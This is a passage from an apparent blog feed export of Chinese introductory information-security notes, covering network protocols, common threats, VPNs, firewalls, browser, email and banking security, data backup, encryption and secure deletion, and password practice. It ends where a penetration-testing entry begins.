<li><p>网络协议模型之OSI与TCP/I</p>
<ul>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/56236981.jpg" alt></p>
</li>
</ul>
</li>
<li><p>TCP/IP协议分层</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/33258003.jpg" alt></p>
</li>
</ul>
</li>
<li><p>通信地址</p>
<ul>
<li>通信其实就是将数据从一端传送到另一端的过程，类似发快递</li>
<li>发快递是需要知道寄出地址和寄到地址</li>
<li>在网络中，寄出地址为源地址，寄到地址为目的地址</li>
</ul>
</li>
<li><p>网络中的通信地址</p>
<ul>
<li>通信中，每台计算机必须有一个全球唯一的物理地址</li>
<li>这个地址工作在网络接口层，被称为MAC地址（48bit）</li>
<li>通信中，每台计算机还必须有一个逻辑地址</li>
<li>宰割地址工作在ip层被称为IP地址（32bit）</li>
</ul>
</li>
<li><p>IP地址分类</p>
<ul>
<li>IP地址除了IPv4，还有IPv6；</li>
<li>IPv4地址已经不够用了，而且，IPv6地址会比IPv4地址多</li>
<li>以后可能会启用IPv6</li>
<li>虽然有4，6之分，但都属于TCP/IP地址族</li>
</ul>
</li>
<li><p>IP地址分类（续）</p>
<ul>
<li>目前大量使用的是IPv4</li>
<li>IPv6地址是由IETF设计的下一代IP协议</li>
<li>IPv6不仅可以解决IPv4地址被耗尽的问题，还可以提高IP协议本身的性能和安全性</li>
<li>IETF是互联网工程任务组</li>
</ul>
</li>
<li><p>封装Encapsulation</p>
<ul>
<li><p>当高层进程要进行数据传输是，会先将数据从高层向低层传送</p>
</li>
<li><p>经过低层时，会分别加上该低层的头部信息置于数据首部</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/11044722.jpg" alt></p>
</li>
</ul>
</li>
<li><p>解封装Decapsulation</p>
<ul>
<li><p>执行封装的逆过程</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/90598124.jpg" alt></p>
</li>
</ul>
</li>
<li><p>IPv4包头格式</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/88861077.jpg" alt></p>
</li>
<li><p>版本：IPv4版本</p>
</li>
<li><p>包头长度：IPv4包头长度</p>
</li>
<li><p>服务类型：针对该IPv4数据包定义转发优先级</p>
</li>
<li><p>数据包长度：IPv4数据包总长度=IPv4包头长度+IPv4用户数据长度</p>
</li>
<li><p>标识：分片重组时保持统一</p>
</li>
<li><p>标记：第二bit置1，表示不能分片，第三bit置1，表示最后一片</p>
</li>
<li><p>偏移：分片重组时还原原始数据位置</p>
</li>
<li><p>生存期：每经过一跳此数值减1，避免数据平面环路导致的无限转发</p>
</li>
<li><p>协议类型：表示上层协议类型</p>
</li>
<li><p>包头校验和：用于校验IPv4包头的正确性</p>
</li>
<li><p>源IP地址：发送方的IPv4地址</p>
</li>
<li><p>目的IP地址：接收方的IPv4地址</p>
</li>
<li><p>可选项：用于表示对IPv4数据包进行一些特殊处理的信息</p>
</li>
<li><p>用户数据：IPv4头部上层负载的全部数据</p>
</li>
</ul>
</li>
<li><p>端口，port</p>
<ul>
<li>计算机中有一些协议常见端口，这些端口绑定了一些服务且明确表示使用某种服务协议，如80端口表示HTTP协议</li>
<li>黑客攻击常将各种协议端口作为入侵通道</li>
<li>端口通过端口号标记，范围是0~65535</li>
</ul>
</li>
<li><p>传输控制协议TCP</p>
<ul>
<li><p>提供面向连接的，可靠的字节流服务</p>
</li>
<li><p>提供可靠性服务</p>
</li>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/13433772.jpg" alt></p>
</li>
</ul>
</li>
<li><p>用户数据报协议UDP</p>
<ul>
<li>提供面向事务的简单不可靠信息传送服务</li>
<li>无连接、不可靠</li>
<li>协议简单、占用资源少，效率高</li>
</ul>
</li>
<li><p>万维网</p>
<ul>
<li>world wide web，WWW</li>
<li>是因特网上使用最广泛的一种信息服务，是因特网的重要组成部分</li>
<li>用户可以通过客户端程序（一般是浏览器）访问服务端程序提供的页面</li>
</ul>
</li>
<li><p>超文本标记语言HTML</p>
<ul>
<li>是一种制作万维网页面的标准语言，为不同的计算机交换信息资源提供了统一的格式</li>
<li>将各种不同格式的对象（如文本、图像、音频）组织在一个个网页中</li>
<li>其后缀为html和htm</li>
</ul>
</li>
<li><p>超文本传输协议HTTP</p>
<ul>
<li>是用于从www服务器传输超文本到本地浏览器的传输协议</li>
<li>可以使浏览器更加高效，使网络传输减少</li>
<li>不仅保证计算机正确快速的传输超文本文档，还确定传输文档中哪一部分，以及哪部分内同首先显示（如文本先于图形）等</li>
</ul>
</li>
<li><p>统一资源定位符URL</p>
<ul>
<li>用户在访问网站时，为了获取特定的信息资源，需要给出特定资源的地址，即URL</li>
<li>是用来标识万维网中每个信息资源的地址</li>
<li>URL由三部分组成：http://主机域名或IP地址[:端口号]/文件路径/文件名</li>
</ul>
</li>
<li><p>思考：</p>
<ul>
<li>IP地址分几个版本，是哪一层的地址？（4和6，是IP层的地址）</li>
<li>MAC地址是哪一层的地址？（网络接口层）</li>
</ul>
</li>
</ul>
<h2 id="3-2-网络安全威胁"><a href="#3-2-网络安全威胁" class="headerlink" title="3.2-网络安全威胁"></a>3.2-网络安全威胁</h2><ul>
<li><p>网络安全威胁</p>
<ul>
<li>网络安全威胁主要来自攻击者对网络及信息系统的攻击</li>
<li>攻击者可以通过网络嗅探、网络钓鱼、拒绝服务、远程控制、社会工程学等网络攻击手段，获得目标计算机的控制权，或者获取有价值的数据和信息</li>
</ul>
</li>
<li><p>网络嗅探</p>
<ul>
<li><p>是通过截获、分析网络中传输的数据而获取有用信息的行为</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/71168308.jpg" alt></p>
</li>
<li><p>嗅探工具捕获的数据包</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/1645977.jpg" alt></p>
</li>
</ul>
</li>
<li><p>网络钓鱼</p>
<ul>
<li>是指攻击者利用伪造的网站或欺骗性的电子邮件进行的额网络诈骗活动</li>
</ul>
</li>
<li><p>网络钓鱼常用手段</p>
<ul>
<li>伪造相似域名的网站</li>
<li>显示IP地址而非域名</li>
<li>超链接欺骗</li>
<li>弹出窗口欺骗</li>
</ul>
</li>
<li><p>拒绝服务攻击Dos</p>
<ul>
<li>拒绝服务攻击</li>
<li>分布式拒绝服务攻击，DDos</li>
<li>同步泛洪攻击，SYN flooding</li>
</ul>
</li>
<li><p>远程控制</p>
<ul>
<li>攻击者通过各种非法手段成功入侵目标主机后，以实现对目标主机的远程控制</li>
</ul>
</li>
<li><p>社会工程学</p>
<ul>
<li>不是一门科学，而是一门综合运用信息手机，语言技巧等多种手段，完成欺骗目的的方法</li>
<li>其概念是由凯文。米特尼克在其著作，《欺骗的艺术》一书中首次提出</li>
</ul>
</li>
<li><p>思考：</p>
<ul>
<li>常见的网络威胁？（网络嗅探、网络钓鱼、拒绝服务、远程控制、社会工程学）</li>
</ul>
</li>
</ul>
<h2 id="3-3-网络安全保护与实践"><a href="#3-3-网络安全保护与实践" class="headerlink" title="3.3-网络安全保护与实践"></a>3.3-网络安全保护与实践</h2><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><ul>
<li><p>虚拟专用网络VPN    </p>
<ul>
<li><p>是在公用网络上建立专用网络的技术</p>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-18/21165231.jpg" alt></p>
</li>
</ul>
</li>
<li><p>VPN的特点</p>
<ul>
<li>成本低</li>
<li>安全性高</li>
<li>服务质量保证</li>
<li>可管理性</li>
<li>可扩展性</li>
</ul>
</li>
<li><p>VPN常用协议</p>
<ul>
<li>IPSec协议</li>
<li>安全套接层协议SSL</li>
</ul>
</li>
<li><p>VPN的应用</p>
<ul>
<li>远程访问VPN，适用于企业内部人员流动频繁或远程办公的情况</li>
<li>内联网VPN，适用于相同企业内部异地互联的情况</li>
<li>外联网VPN，适用于不同企业之间互联的情况</li>
</ul>
</li>
</ul>
<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><ul>
<li>简介：<ul>
<li>计算机网络中所说的防火墙，是指设置在不同网络（如可信任的内网和外网或专用网与不可信的公用网）之间的一系列包括软硬件在内的部件组合</li>
<li>其在内外网之间构建一道保护屏障</li>
<li>网络内部和外部之间的所有数据流必须经过防火墙</li>
<li>只有符合安全标准的数据流才能通过防火墙</li>
</ul>
</li>
<li>补充：<ul>
<li>数据包过滤</li>
<li>审计和报警机制</li>
<li>远程管理</li>
<li>网络地址转换</li>
<li>代理</li>
<li>流量控制、统计分析和流量计费</li>
</ul>
</li>
<li>思考：<ul>
<li>什么是防火墙，其主要功能是？</li>
</ul>
</li>
</ul>
<h2 id="3-4-无线局域网安全防护"><a href="#3-4-无线局域网安全防护" class="headerlink" title="3.4-无线局域网安全防护"></a>3.4-无线局域网安全防护</h2><ul>
<li>概述<ul>
<li>无线局域网技术可以非常便捷的以无线方式连接网络设备，相对于有线局域网具有许多优点，如人们可以随时随地访问网络资源</li>
</ul>
</li>
<li>增强无线网络安全性的措施<ul>
<li>修改admin密码</li>
<li>使用无线网络安全协议</li>
<li>禁用DHCP服务</li>
<li>禁止SSID广播</li>
<li>禁止远程管理</li>
<li>MAC地址过滤</li>
<li>合理放置无线AP</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之应用与数据安全</title>
    <url>/2018/07/05/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E5%BA%94%E7%94%A8%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="05-应用与数据安全"><a href="#05-应用与数据安全" class="headerlink" title="05-应用与数据安全"></a>05-应用与数据安全</h1><ul>
<li>目录<ul>
<li>浏览器安全</li>
<li>网上金融交易安全</li>
<li>电子邮件安全</li>
<li>数据安全</li>
<li>账号口令安全</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="5-1-浏览器安全"><a href="#5-1-浏览器安全" class="headerlink" title="5.1-浏览器安全"></a>5.1-浏览器安全</h2><h3 id="服务器端和客户端"><a href="#服务器端和客户端" class="headerlink" title="服务器端和客户端"></a>服务器端和客户端</h3><ul>
<li>服务器端<ul>
<li>是指网络中能对其他计算机和终端提供某些服务的计算机系统，如新浪网站服务器</li>
</ul>
</li>
<li>客户端<ul>
<li>客户端与服务器端相对应</li>
<li>是指为客户提供本地服务的程序，一般安装在普通的客户机上，需要与服务器端互相配合运行，如安装在移动智能终端上的地图导航程序</li>
</ul>
</li>
</ul>
<h3 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h3><ul>
<li>客户端/服务器架构，是一种软件系统的体系结构</li>
<li>此结构中程序和服务器端程序通常分布于两台计算机上，客户端程序的任务是将用户的要求提交给服务器端程序，再将服务器端程序返回的结果以特定的形式显示给用户</li>
<li>服务器端程序的任务是接收客户端程序提出的服务请求，并进行相应的处理，再将结果返回给客户端程序</li>
</ul>
<h3 id="B-S架构"><a href="#B-S架构" class="headerlink" title="B/S架构"></a>B/S架构</h3><ul>
<li>浏览器/服务器结构，终端用户不需要安装专门的软件，只需要安装浏览器即可</li>
<li>此结构将系统功能的核心部分集中到服务器上</li>
<li>以新浪为例，用户所使用的浏览器即为客户端程序，在浏览器中输入新浪的网址，用户就向新浪的网站服务器发出访问请求，新浪的服务器接受客户端访问请求并进行处理，将结果返回给浏览器，由浏览器显示，提供给用户查看。</li>
<li>B/S模式发展迅速，针对浏览器的安全威胁也越来越多，因此浏览器安全至关重要</li>
</ul>
<h3 id="浏览器安全措施"><a href="#浏览器安全措施" class="headerlink" title="浏览器安全措施"></a>浏览器安全措施</h3><ul>
<li>浏览器是可以显示网页文件，并提供用户与服务器交互功能的一种软件</li>
<li>浏览器安全措施<ul>
<li>删除和管理cookies</li>
<li>删除浏览器历史纪录</li>
<li>禁用activeX控件</li>
</ul>
</li>
<li>删除和管理cookies<ul>
<li>cookie是指网站放置在个人计算机上的小文件，用于存储用户信息和用户偏好的资料</li>
<li>cookie可以记录用户访问某个网站的长高和口令，从而避免每次访问网站时都需要使用输入账号和口令登录</li>
<li>cookie也存在安全隐患，因cookie中保存的信息含有一些个人隐私，若攻击者获取这些cookie信息，就会危及个人隐私安全，所以在公用计算机上使用浏览器后需要删除cookie信息</li>
</ul>
</li>
<li>删除浏览器历史记录<ul>
<li>浏览历史记录是在用户浏览网页时，由浏览器记住并存储在计算机中的信息</li>
<li>这些信息包括输入表单的信息、口令和访问的网站等，方便用户再次使用浏览器访问网站</li>
<li>如果用户使用公用计算机上，可有选择的删除</li>
</ul>
</li>
<li>禁用ActiveX控件<ul>
<li>activeX控件是一些嵌入在网页中的小程序，网站可以使用这类小程序提供视频和游戏等内容</li>
<li>浏览网站服务器时，用户还可以使用这些小程序与工具栏等内容进行交互</li>
<li>activeX控件会导致一些安全隐患，攻击者可以使用activeX控件向用户提供不需要的服务</li>
<li>某些情况下，这些程序还可以用来收集用户计算机的个人信息，破坏计算机的信息，或者在未获取用户同意的情况下安装恶意软件</li>
</ul>
</li>
<li>思考<ul>
<li>c/s和b/s模式的区别？（<ul>
<li>cs模式，客户端的电脑也可以参与整个系统的事务处理，可以处理一些不需要服务器处理的服务</li>
<li>bs模式，浏览器只能通过浏览程序ie等，访问服务器，显示服务器提供的信息，整个系统的事务处理都要由服务器来完成</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-2-网上金融交易安全"><a href="#5-2-网上金融交易安全" class="headerlink" title="5.2-网上金融交易安全"></a>5.2-网上金融交易安全</h2><ul>
<li>网上金融交易<ul>
<li>用户通过因特网完成各种网络金融服务（开户、查询、付账等）和网络电子商务支付，用户足不出户完成各种金融业务</li>
<li>网络电子商务支付可以使用银行卡或第三方支付平台完成网络购物，如车票等</li>
<li>为保障安全，网上金融交易一般不采用简单的账号口令的验证方式来识别用户身份，多采用双因素身份认证识别用户身份，只有通过认证的才可以完成操作</li>
</ul>
</li>
<li>网上金融交易常用安全措施<ul>
<li>U盾，usb-key</li>
<li>手机短信验证</li>
<li>口令卡</li>
<li>采用安全超文本传输协议</li>
</ul>
</li>
</ul>
<h3 id="U盾"><a href="#U盾" class="headerlink" title="U盾"></a>U盾</h3><ul>
<li>u盾时用于网上电子银行签名和数字认证的工具，其内置微型智能卡处理器，采用非对称加密体制对网上数据进行加密、解密和数字签名</li>
<li>用户选择使用U盾后，所有涉及资金对外转移的网银操作，都必须使用U盾才能完成</li>
<li>使用U盾时，除了需要将U盾插入计算机，还需要输入设置的口令才能完成身份认证</li>
</ul>
<h3 id="手机短信验证"><a href="#手机短信验证" class="headerlink" title="手机短信验证"></a>手机短信验证</h3><ul>
<li>用户向网络金融交易平台发出交易请求后</li>
<li>网络金融平台通过短信向用户绑定的手机号码发出一次性口令</li>
<li>只有在输入正确的用户口令和短信验证口令后，整个交易才能被确认并完成</li>
</ul>
<h3 id="口令卡"><a href="#口令卡" class="headerlink" title="口令卡"></a>口令卡</h3><ul>
<li>口令卡相当于一种动态的电子银行口令</li>
<li>口令卡上以矩阵的形式印有若干字符串，用户在使用电子银行进行对外转账等支付交易时，电子银行系统就会随机给出一组口令卡坐标，用户根据坐标从卡片中找到口令组合并输入</li>
<li>只有口令组合输入正确时，用户才能完成相关交易</li>
<li>这种口令组合是动态变化的，用户每次使用时输入的口令都不一样，交易结束后即失效，从而防止攻击者窃取用户口令</li>
<li></li>
</ul>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><ul>
<li>https是以安全为目标的http通道协议，是HTTP的安全版</li>
<li>https协议提供了身份验证与加密通信的方法，广泛用于因特网上安全敏感的通信，例如银行网站登录采用https方式</li>
<li>该安全协议很大程度上保障用户数据的安全</li>
</ul>
<h3 id="5-3-电子邮件安全"><a href="#5-3-电子邮件安全" class="headerlink" title="5.3-电子邮件安全"></a>5.3-电子邮件安全</h3><ul>
<li>电子邮件系统<ul>
<li>电子邮件是一种用电子手段提供信息交换的服务方式，是因特网上应用广泛的服务之一</li>
</ul>
</li>
<li>电子邮件安全威胁<ul>
<li>邮件地址欺骗</li>
<li>垃圾邮件</li>
<li>邮件病毒</li>
<li>邮件炸弹</li>
</ul>
</li>
</ul>
<h3 id="邮件地址欺骗"><a href="#邮件地址欺骗" class="headerlink" title="邮件地址欺骗"></a>邮件地址欺骗</h3><ul>
<li>是黑客攻击和垃圾邮件制造者常用的方法</li>
<li>由于在SMTP协议中，邮件发送者可以指定SMTP发送者的发送账户、发送账户的显示名称、SMTP服务器域名等信息，如果接收端未对这些信息进行认证，就可能放过一些可以伪造的邮件</li>
<li>攻击者可以通过自行搭建SMTP服务器来发送伪造地址的邮件</li>
<li>目前，正规的邮件服务器都有黑名单和反向认证等机制，如检查邮件来源IP、检查邮件发送域、反向DNS查询、登录验证等</li>
<li>伪造邮件一般很难通过严格设置的邮件服务器，但用户还是要对邮件内容涉及敏感信息的邮件来源保持高度警惕</li>
<li></li>
</ul>
<h3 id="垃圾邮件"><a href="#垃圾邮件" class="headerlink" title="垃圾邮件"></a>垃圾邮件</h3><ul>
<li>是指未经用户许可就强行发送到用户邮箱的电子邮件</li>
<li>垃圾邮件一般具有批量发送的特征，其内容包括广告等</li>
<li>垃圾邮件可以分为良性和恶性的</li>
<li>良性垃圾邮件是对收件人影响不大的信息邮件，例如宣传广告</li>
<li>恶意垃圾邮件是指具有破坏性的电子邮件，例如携带恶意代码的广告</li>
</ul>
<h3 id="邮件病毒"><a href="#邮件病毒" class="headerlink" title="邮件病毒"></a>邮件病毒</h3><ul>
<li>邮件病毒和普通病毒在功能上是一样的</li>
<li>他们主要通过电子邮件进行传播，因此被称为邮件病毒</li>
<li>一般通过邮件附件发送病毒，接收者打开邮件，运行附件会使计算机中毒</li>
</ul>
<h3 id="邮件炸弹"><a href="#邮件炸弹" class="headerlink" title="邮件炸弹"></a>邮件炸弹</h3><ul>
<li>是指邮件发送者利用特殊的电子邮件软件，在很短的时间内连续地将邮件发送给同一收信人，</li>
<li>由于用户邮箱存储空间有限，没有多余空间接受新邮件，新邮件将会丢失或退回，从而造成收件人邮箱功能瘫痪</li>
<li>同时，邮件炸弹会大量消耗网络资源，会导致网络阻塞，严重时会影响到大量用户邮件的使用</li>
</ul>
<ul>
<li>电子邮件安全防护技术<ul>
<li>垃圾邮件过滤技术</li>
<li>邮件加密和签名</li>
<li></li>
</ul>
</li>
</ul>
<ul>
<li>垃圾邮件过滤技术<ul>
<li>是应对垃圾邮件问题的有效手段之一，由黑白名单过滤和智能内容过滤两种技术</li>
<li>黑白名单过滤<ul>
<li>采用最简单直接的方式对垃圾邮件进行过滤</li>
<li>由用户手动添加需要过滤的域名、发信人或发信IP地址等</li>
<li>对于常见的广告型垃圾邮件效果明显</li>
<li>此种方式属于被动防御，需要大量手工操作，每次都需要对黑白名单进行手动添加</li>
</ul>
</li>
<li>内容过滤：<ul>
<li>主要针对邮件标题、邮件附件文件名和邮件附件大小等选项设定关键值</li>
<li>当上述选项被认定是垃圾邮件，邮件系统会将其直接删除</li>
</ul>
</li>
</ul>
</li>
<li>邮件加密和签名<ul>
<li>未经加密的邮件，经过加密和签名，可提高安全性</li>
<li>用于电子邮件加密和签名的软件：GnuPG（常见的开源软件</li>
<li>GnuPG是一个基于RSA公钥密码体制的邮件加密软件，可以加密邮件以防止非授权者阅读，同时还可以对邮件加上数字签名，使收信人剋确认邮件发送者，并确认邮件没有被篡改</li>
</ul>
</li>
<li></li>
</ul>
<h2 id="5-4-数据安全"><a href="#5-4-数据安全" class="headerlink" title="5.4-数据安全"></a>5.4-数据安全</h2><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><ul>
<li>系统运行和维护的过程中，常会有一些因素导致数据丢失，为确保数据安全性，需要对数据进行备份</li>
<li>数据备份是容灾的基础，是为防止系统出现操作失误或系统故障导致数据丢失，而将全部或部分数据集合，从应用主机的硬盘或阵列复制到其它异地存储介质或移动硬盘的过程</li>
<li>备份的方式有多种，传统方式是采用内置或外置的磁带机进行冷备份<ul>
<li>备份后的磁带机数据保存在安全的位置，这种备份方式恢复数据的时间很长</li>
</ul>
</li>
<li>随着海量数据的增加，开始采用网络备份<ul>
<li>网络备份一般通过专业的数据存储管理软件结合相应的硬件和存储设备来实现</li>
</ul>
</li>
<li>随着云计算和云技术发展，出现云备份<ul>
<li>个人或企业可以将重要数据备份到云服务器上，需要使用时，从云服务器上下载到本地使用</li>
</ul>
</li>
</ul>
<h3 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h3><ul>
<li>数据丢失后，就需要数据恢复</li>
<li>了解其基本原理并掌握常用数据恢复工具，可以恢复丢失的数据，挽回损失</li>
<li>若不慎删除硬盘分区信息或误格式化硬盘，造成系统信息区破坏，无法读取数据资料，首先应关机，不要轻易对硬盘数据资料进行写操作，否则会增加数据恢复的难度，重启开机后，再使用数据恢复工具完成恢复工作</li>
<li>EasyRecovery是一款常用数据恢复工具，它可以帮助用户恢复丢失的数据以及重建文件系统<ul>
<li>其不会向用户的原始驱动器写入任何数据</li>
<li>其工作原理是在内存种重建文件分区表，然后将数据安全地传输到其他驱动器中</li>
</ul>
</li>
<li>使用数据恢复软件找回数据文件的前提是硬盘中还保留有误删除文件的信息和数据块</li>
<li>当用户误删除文件或误格式化U盘后，不要在该分区中写入任何文件，否则这些需要恢复的数据就有可能被写入的数据覆盖，恢复数据的难度就会加大</li>
<li>因此，为了恢复误删除的数据，就不能对要修复的分区或硬盘进行新的读写操作</li>
</ul>
<h3 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h3><ul>
<li>是保护数据安全的主要手段之一，可避免用户在传输或存储重要信息过程中，被第三方窃取信息</li>
<li>数据加密工具可以分为：<ul>
<li>硬件加密<ul>
<li>直接通过硬件单元，如利用USB接口或者计算机并行口等对数据进行加密</li>
<li>加密后可以有效地保护用户信息、隐私或知识产权</li>
</ul>
</li>
<li>软件加密<ul>
<li>主要有文件加密工具、光盘加密工具和磁盘加密工具</li>
</ul>
</li>
</ul>
</li>
<li>对单个文件或文件夹进行加密的工具有很多，如zip和rar压缩包可以用来加密大文件，压缩时可以设置密码，输入正确密码后才可以解压</li>
<li>WPS，word，PPT等也可以通过设置口令的方式来加密文件</li>
<li>光盘加密工具可以防止光盘数据被复制，可采用的方法很多，用户可以给光盘添加密码，<ul>
<li>如SecureBurn软件可以在正式刻录之前对光盘进行密码保护，然后通过软件内置的刻录功能即可直接获得有密码保护的光盘，用户也可以让文件只在光盘中运行</li>
<li>又如，CD-Protector制作的加密光盘，他人无法通过直接复制文件获得光盘中的重要文件，即使把文件复制到硬盘再运行也会出现出错提示信息而不能使用</li>
<li>光盘加密工具可以对镜像文件进行可视化修改，隐藏光盘镜像文件</li>
<li>此外，还可以放大一般的文件，将普通目录改为文件目录，由此保护光盘中的机密文件和有关隐私的信息</li>
<li>磁盘加密工具则是对磁盘数据进行加密</li>
</ul>
</li>
<li>目前磁盘加密工具主要有：<ul>
<li>PGPDisk</li>
<li>TrueCrypt</li>
</ul>
</li>
<li>为了数据安全，加密数据时应尽量保证：<ul>
<li>加密过程足够强壮并覆盖整个磁盘，包括剩余空间、交换文件</li>
<li>加密密钥足够长，能够抵御暴力破解攻击</li>
<li>加密密钥自身的机密性能够得到保障，例如用于加密磁盘的密钥从来不存储在被加密保护的磁盘中</li>
</ul>
</li>
<li>除了采用数据加密保证数据的保密性，用户还可以通过对数据文件添加数字签名来保证数据文件的完整性和真实性，防止数据被篡改或伪造，也可避免可能存在的欺骗和抵赖，一些应用软件可以对数据文件进行签名，如word，邮件客户端Foxmail等</li>
</ul>
<h3 id="数据删除"><a href="#数据删除" class="headerlink" title="数据删除"></a>数据删除</h3><ul>
<li>不法分子通过对存储介质进行数据恢复来窃取曾经存储的重要数据，导致泄密，彻底删除计算机数据，防止数据泄露，也是很重要的</li>
<li>Windows中，delete-放入回收站，shift+delete或清空回收站才会真正删除；</li>
<li>由于Windows操作系统只考虑了由操作系统本身对系统资源存取，因此无论是在文件分配表（file allocation table，FAT）还是新技术文件系统（new technology file system，NTFS）下，操作系统删除文件的标准都是对操作系统不可见；事实上，只是对文件的目录做了删除标记，保证率文件在删除前所占用的空间确实得到释放，而文件实际存放在数据区的内容毫无改，从以上原理知，只要数据区没有被破坏，数据就没有被完全删除，就存在被恢复的可能</li>
<li>数据安全删除就是要完全删除了要删除的文件，包括文件相关属性信息，即完全破坏数据，使数据恢复无法进行，从而实现保护数据的目的</li>
<li>安全删除的方法，可分为：<ul>
<li>硬销毁</li>
<li>软销毁</li>
</ul>
</li>
</ul>
<ul>
<li>数据删除-硬销毁<ul>
<li>即破坏性销毁，是指采用物理破坏或者化学腐蚀的方法把记录涉密数据的物理载体完全破坏掉</li>
<li>然而从根本上删除数据的销毁方式，是对保护数据不被恢复的安全的、彻底的方法</li>
<li>可分为：<ul>
<li>物理销毁<ul>
<li>又可分为消磁、熔炉中焚化和熔炼、借助外力粉粹及研磨磁盘表面等方法</li>
<li>费时，费力，适用于保密要求较高的场合</li>
</ul>
</li>
<li>化学销毁<ul>
<li>采用化学药品腐蚀、溶解磁盘记录表面的数据销毁方法</li>
<li>只能由专业人员在特定场所中进行</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数据删除-软销毁<ul>
<li>即逻辑销毁，是指通过软件编程实现对数据及相关信息的反复覆盖擦除，达到不可恢复的安全删除目的</li>
<li>一般情况下，认为低级格式化以后，数据恢复的可能性依然存在</li>
<li>要保证安全，必须通过多次写入新数据来覆盖旧数据才能真正达到数据安全删除的目的</li>
<li>数据软销毁通常采用数据覆写法</li>
<li>数据覆写是将非保密数据写入以前存有敏感数据的硬盘簇的过程，其技术原理是依据硬盘上的书都是以二进制的1和0形式存储的，而使用预先定义的无意义、无规律的信息反复多次覆盖硬盘上原先存储的数据，就无法知道原先的数据，也就达到了销毁数据的目的</li>
<li>由于经过数据覆写法处理后的硬盘可以循环使用，适用于密级要求不是很高的场合，特别是需要对某一具体文件进行销毁而其他文件不能破坏时，此方法更实用</li>
<li>现在常用的数据销毁软件，例如BCWipe，Eraser等，主要是针对文件、剩余空间和物理磁盘的销毁。所采用的方式都是通过软件对磁盘进行相应的覆写</li>
<li>数据覆写技术犹如碎纸机，是安全、经济的数据软销毁方式之一。</li>
</ul>
</li>
</ul>
<ul>
<li>思考：<ul>
<li>使用Easy Recovery工具恢复数据最为重要的因素是？<ul>
<li>当用户误删除文件或者误格式化U盘后，不要在该分区中写入任何文件，否则这些需要恢复的数据就有可能被写入的数据覆盖，恢复数据的难度就会加大。因此，为了恢复误删除的数据，就不能对要修复的分区或硬盘进行新的读写操作</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-5-账户口令安全"><a href="#5-5-账户口令安全" class="headerlink" title="5.5-账户口令安全"></a>5.5-账户口令安全</h2><ul>
<li>用户使用应用时，需通过账号和口令来验证身份从而访问某些资源，因此，账号口令的安全性非常重要</li>
<li>攻击者窃取口令的方式主要有三种：<ul>
<li>暴力破解<ul>
<li>又称为口令穷举，就是通过计算机对所有可能的口令组合进行穷举尝试</li>
<li>如果攻击者已知用户账号，用户的口令又比较简单，例如比较简单的数字组合，攻击者使用暴力破解工具很快可以破译口令</li>
<li>因此在一些安全性较高的系统，如网银系统，会限制口令的输入次数，降低暴力破解口令的成功率</li>
</ul>
</li>
<li>键盘记录木马<ul>
<li>若用户的计算机被植入键盘记录木马，当用户通过键盘输入口令时，键盘记录木马程序会记住用户输入的口令，然后木马程序通过自带邮件发送功能把记录的口令发送到制定者的邮箱</li>
</ul>
</li>
<li>屏幕快照木马<ul>
<li>若用户的计算机被植入屏幕快照木马，木马程序会通过屏幕快照将用户的登录界面连续保存为两张黑白图片，然后通过自带的发信模块将图片发送到制定邮箱</li>
<li>攻击者通过对照图片中鼠标的点击位置，就能破译出用户账号和口令</li>
</ul>
</li>
</ul>
</li>
<li>用户在设置账号的口令时，应遵循以下原则<ul>
<li>严禁使用空口令</li>
<li>严禁使用与账号相同或相似的口令</li>
<li>不要设置简单字母和数字组成的口令</li>
<li>不要设置短于6各字符或仅包含字母或数字的口令</li>
<li>不要使用与个人有关的信息作为口令内容，如生日等</li>
</ul>
</li>
<li>为了保证口令的安全性，建议用户每隔一段时间更新一次账号口令</li>
<li>如果用户是在公共场所使用计算机上网，登录账户时不要选择保存口令和自动登录，离开时要清除使用过的记录</li>
</ul>
<h2 id="5-6-实验"><a href="#5-6-实验" class="headerlink" title="5.6-实验"></a>5.6-实验</h2>]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试方法</title>
    <url>/2018/02/28/web/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="kali-Linux渗透测试方法"><a href="#kali-Linux渗透测试方法" class="headerlink" title="kali Linux渗透测试方法"></a>kali Linux渗透测试方法</h1><h2 id="安全问题的根源"><a href="#安全问题的根源" class="headerlink" title="安全问题的根源"></a>安全问题的根源</h2><ul>
